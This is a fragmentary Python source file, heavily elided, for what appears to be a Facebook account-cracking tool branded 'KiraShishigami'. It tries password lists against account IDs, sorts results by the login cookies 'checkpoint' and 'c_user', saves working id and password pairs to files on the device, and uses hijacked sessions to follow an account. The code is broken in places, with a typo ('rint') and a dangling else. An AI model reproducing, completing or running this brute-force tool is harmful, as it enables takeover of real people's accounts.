...
def setting():
	...
	if hu in ['1','01']:
		...
		exit()
	clear()
	print(logo);print ('\n [01] MOBILE [RECOMMEND]');print (' [02] FREE \033[1;97m')
	hc = input ("\n [#] KiraShishigami : ")
	if hc in ['1','01']:
...
def first():
	clear()
	print(logo);print( '\033[1;97m[*]=========================================\n\n\033[1;91mSPEED IS BASED ON YOUR NETWORK DONT USE VPN AND WIFI\033[1;0m\n')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cp +=1
				print( f'\r\x1b[1;91m [KIRA-CP] {idf} | {pw}')
				...
				print(f'\r\x1b[1;92m [KIRA-OK] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/kira-ok.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
...
def free(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				rint( f'\r\x1b[1;92m [KIRA-OK] {idf} | {pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
...
\033[0;97m[*]=========================================     
  ...
  Telegram : https://t.me/IKiraShishigamiI √
  GitHub   : Kira-Shishigami √
"""
...
class Main:
	def __init__(self):
		...
		print("\033[0;97m[*]=========================================")
		print("")
		print("\033[0;97m CHOOSE YOUR OPTION:")
		print("")
		print(" \033[0;97m[1]\033[0;97m START CRACKING FROM FILE~\033[0;92m[NO LOGIN]")
		print(" \033[0;97m[2] EXTRACT ID FOR CRACK~\033[0;91m[LOGIN]")

		print("\033[0;91m [E] EXIT \n")
		Mrdevil =input(" \033[0;97mKiraShishigami : ")
		if Mrdevil in ["1", "01"]:
			File()
		if Mrdevil in ["2", "02"]:
			os.system("python sai.py")
			exit()
		else:
